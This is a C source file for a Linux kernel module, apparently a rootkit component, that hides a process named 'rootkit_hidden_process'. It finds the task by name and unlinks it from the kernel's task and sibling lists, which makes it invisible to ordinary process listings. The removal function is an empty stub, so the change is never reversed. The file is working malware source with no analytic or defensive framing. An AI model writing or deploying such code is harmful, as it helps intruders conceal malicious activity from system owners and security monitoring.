#include <linux/module.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/string.h>
#include "process_hiding.h"

#define HIDE_PROCESS_NAME "rootkit_hidden_process"

static struct task_struct *find_process_by_name(const char *name) {
    struct task_struct *task;
    for_each_process(task) {
        if (strstr(task->comm, name))
            return task;
    }
    return NULL;
}

void setup_process_hiding(void) {
    struct task_struct *task = find_process_by_name(HIDE_PROCESS_NAME);
    if (task) {
        list_del_init(&task->tasks);
        list_del_init(&task->sibling);
    }
}

void remove_process_hiding(void) {
}
